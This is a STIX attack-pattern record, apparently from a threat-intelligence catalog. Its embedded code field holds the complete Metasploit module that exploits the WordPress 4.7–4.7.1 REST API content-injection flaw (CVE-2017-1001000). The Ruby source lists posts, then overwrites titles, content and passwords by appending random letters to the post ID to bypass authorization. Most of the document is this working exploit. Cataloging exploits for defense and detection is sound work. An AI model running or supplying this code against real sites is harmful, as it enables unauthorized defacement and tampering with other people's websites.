{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5daa04c-611a-4180-a6a4-84c2d502b484",
    "created": "2024-08-14T16:28:53.527122Z",
    "modified": "2024-08-14T16:28:53.527126Z",
    "name": "WordPress REST API Content Injection",
    "description": " This module exploits a content injection vulnerability in WordPress versions 4.7 and 4.7.1 via type juggling in the REST API. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wordpress_content_injection.rb",
            "external_id": "wordpress_content_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1001000"
        },
        {
            "source_name": "WPVDB",
            "external_id": "8734"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.php.net/manual/en/language.types.type-juggling.php"
        },
        {
            "source_name": "reference",
            "url": "https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/"
        },
        {
            "source_name": "reference",
            "url": "https://developer.wordpress.org/rest-api/reference/posts/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress REST API Content Injection',\n      'Description'    => %q{\n        This module exploits a content injection vulnerability in WordPress\n        versions 4.7 and 4.7.1 via type juggling in the REST API.\n      },\n      'Author'         => [\n        'Marc Montpas', # Vulnerability discovery\n        'wvu'           # Metasploit module\n      ],\n      'References'     => [\n        ['CVE' , '2017-1001000'],\n        ['WPVDB', '8734'],\n        ['URL',   'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html'],\n        ['URL',   'https://www.php.net/manual/en/language.types.type-juggling.php'],\n        ['URL',   'https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/'],\n        ['URL',   'https://developer.wordpress.org/rest-api/reference/posts/']\n      ],\n      'DisclosureDate' => '2017-02-01',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [\n        ['LIST',   'Description' => 'List posts'],\n        ['UPDATE', 'Description' => 'Update post']\n      ],\n      'DefaultAction'  => 'LIST'\n    ))\n\n    register_options([\n      OptInt.new('POST_ID',          [false, 'Post ID (0 for all)', 0]),\n      OptString.new('POST_TITLE',    [false, 'Post title']),\n      OptString.new('POST_CONTENT',  [false, 'Post content']),\n      OptString.new('POST_PASSWORD', [false, 'Post password (\\'\\' for none)'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('PostCount',     [false, 'Number of posts to list', 100]),\n      OptString.new('SearchTerm', [false, 'Search term when listing posts'])\n    ])\n  end\n\n  def check_host(_ip)\n    if (version = wordpress_version)\n      version = Rex::Version.new(version)\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    vprint_status(\"WordPress #{version}: #{full_uri}\")\n\n    if version.between?(Rex::Version.new('4.7'), Rex::Version.new('4.7.1'))\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Detected\n    end\n  end\n\n  def run_host(_ip)\n    if !wordpress_and_online?\n      print_error(\"WordPress not detected at #{full_uri}\")\n      return\n    end\n\n    case action.name\n    when 'LIST'\n      do_list\n    when 'UPDATE'\n      do_update\n    end\n  end\n\n  def do_list\n    posts_to_list = list_posts\n\n    if posts_to_list.empty?\n      print_status(\"No posts found at #{full_uri}\")\n      return\n    end\n\n    tbl = Rex::Text::Table.new(\n      'Header'  => \"Posts at #{full_uri} (REST API: #{get_rest_api})\",\n      'Columns' => %w{ID Title URL Password}\n    )\n\n    posts_to_list.each do |post|\n      tbl << [\n        post[:id],\n        Rex::Text.html_decode(post[:title]),\n        post[:url],\n        post[:password] ? 'Yes' : 'No'\n      ]\n    end\n\n    print_line(tbl.to_s)\n  end\n\n  def do_update\n    posts_to_update = []\n\n    if datastore['POST_ID'] == 0\n      posts_to_update = list_posts\n    else\n      posts_to_update << {id: datastore['POST_ID']}\n    end\n\n    if posts_to_update.empty?\n      print_status(\"No posts to update at #{full_uri}\")\n      return\n    end\n\n    posts_to_update.each do |post|\n      res = update_post(post[:id],\n        title:    datastore['POST_TITLE'],\n        content:  datastore['POST_CONTENT'],\n        password: datastore['POST_PASSWORD']\n      )\n\n      post_url = full_uri(wordpress_url_post(post[:id]))\n\n      if res && res.code == 200\n        print_good(\"SUCCESS: #{post_url} (Post updated)\")\n      elsif res && (error = res.get_json_document['message'])\n        print_error(\"FAILURE: #{post_url} (#{error})\")\n      end\n    end\n  end\n\n  def list_posts\n    posts = []\n\n    res = send_request_cgi({\n      'method'     => 'GET',\n      'uri'        => normalize_uri(get_rest_api, 'posts'),\n      'vars_get'   => {\n        'per_page' => datastore['PostCount'],\n        'search'   => datastore['SearchTerm']\n      }\n    }, 3.5)\n\n    if res && res.code == 200\n      res.get_json_document.each do |post|\n        posts << {\n          id:       post['id'],\n          title:    post['title']['rendered'],\n          url:      post['link'],\n          password: post['content']['protected']\n        }\n      end\n    elsif res && (error = res.get_json_document['message'])\n      vprint_error(\"Failed to list posts: #{error}\")\n    end\n\n    posts\n  end\n\n  def update_post(id, opts = {})\n    payload = {}\n\n    payload[:id]       = \"#{id}#{Rex::Text.rand_text_alpha(8)}\"\n    payload[:title]    = opts[:title] if opts[:title]\n    payload[:content]  = opts[:content] if opts[:content]\n    payload[:password] = opts[:password] if opts[:password]\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(get_rest_api, 'posts', id),\n      'ctype'  => 'application/json',\n      'data'   => payload.to_json\n    }, 3.5)\n  end\n\n  def get_rest_api\n    return @rest_api if @rest_api\n\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path)\n    }, 3.5)\n\n    if res && res.code == 200\n      @rest_api = parse_rest_api(res)\n    end\n\n    @rest_api ||= wordpress_url_rest_api\n  end\n\n  def parse_rest_api(res)\n    rest_api = nil\n\n    link = res.headers['Link']\n    html = res.get_html_document\n\n    if link =~ %r{^<(.*)>; rel=\"https://api\\.w\\.org/\"$}\n      rest_api = route_rest_api($1)\n      vprint_status('REST API found in Link header')\n    elsif (xpath = html.at('//link[@rel = \"https://api.w.org/\"]/@href'))\n      rest_api = route_rest_api(xpath)\n      vprint_status('REST API found in HTML document')\n    end\n\n    rest_api\n  end\n\n  def route_rest_api(rest_api)\n    normalize_uri(path_from_uri(rest_api), 'wp/v2')\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-01"
}